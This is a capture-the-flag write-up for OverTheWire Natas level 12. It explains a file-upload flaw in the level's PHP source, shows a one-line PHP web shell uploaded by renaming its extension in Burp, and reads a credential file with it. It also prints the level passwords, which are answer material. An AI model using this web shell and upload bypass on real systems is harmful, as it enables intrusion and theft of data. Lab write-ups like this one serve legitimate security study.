# Natas12 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas12
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
URL:      http://natas12.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.
- Now, it is time for file upload vulnerabilities. Check the source code.

  ```
  <?php

  function genRandomString() {
      $length = 10;
      $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
      $string = "";
  
      for ($p = 0; $p < $length; $p++) {
          $string .= $characters[mt_rand(0, strlen($characters)-1)];
      }
  
      return $string;
  }
  
  function makeRandomPath($dir, $ext) {
      do {
      $path = $dir."/".genRandomString().".".$ext;
      } while(file_exists($path));
      return $path;
  }
  
  function makeRandomPathFromFilename($dir, $fn) {
      $ext = pathinfo($fn, PATHINFO_EXTENSION);
      return makeRandomPath($dir, $ext);
  }
  
  if(array_key_exists("filename", $_POST)) {
      $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
  
  
          if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
          echo "File is too big";
      } else {
          if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
              echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
          } else{
              echo "There was an error uploading the file, please try again!";
          }
      }
  } else {
  ?>
  ```

- First, create a PHP shell and rename it to `shell.jpg`.

  ```
  cat shell.php 
  <?php echo shell_exec($_GET['cmd']); ?>
  ```

- Now, upload our shell and intercept the request with Burp, then change the extension of the shell back to `.php`.

  <img src=""/>

- After successful upload, you will get a link to the page of your shell which allows command injection.

  <img src=""/>

- Visit the shell page and execute command `cat /etc/natas_webpass/natas13` in order to get a password.

  <img src=""/>

---

## 🏁 Password for the next level

`natas13 password is trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
